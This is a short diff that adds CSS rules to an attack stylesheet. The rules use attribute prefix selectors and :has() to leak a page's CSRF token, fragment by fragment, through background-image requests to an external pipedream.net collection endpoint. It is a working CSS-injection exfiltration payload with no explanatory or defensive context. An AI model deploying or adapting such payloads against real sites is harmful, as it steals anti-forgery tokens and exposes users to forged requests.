@@ -9,3 +9,9 @@ input[name=csrf][value^=b]{
 input[name=csrf][value^=csrF] ~ * {
     background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/csrF);
 }
+
+form:has(input[name=csrf][value^=token]) {
+    background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/csrf);
+}
+
+input[name=csrf][value^=sa] { background: url(//eoa21cz1z5v9xqj.m.pipedream.net/sa); }
